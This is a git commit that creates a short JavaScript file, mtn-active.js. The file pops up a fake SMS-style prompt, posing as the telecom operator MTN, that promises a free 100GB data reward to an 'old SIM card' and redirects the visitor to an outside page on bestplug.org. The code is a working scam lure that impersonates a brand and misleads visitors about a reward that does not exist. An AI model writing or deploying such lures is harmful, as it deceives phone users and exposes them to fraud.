0f186dc5837dc8a7df10b02893f27fec86523c07
vibeblog <enom02567@gmail.com>
2025-05-10 07:24:03 +0100

    Create mtn-active.js

---
+++ mtn-active.js
@@ -0,0 +1,5 @@
+var password = 'Activate 100GB'
+password=prompt('SMS: Congratulations, your MTN SIM card is eligible to receive free data old sim card reward, click OK to activate now','Activate 100GB');
+if (password != 'Activate 100GB') {
+location.href='https://bestplug.org/mtn.html';
+}
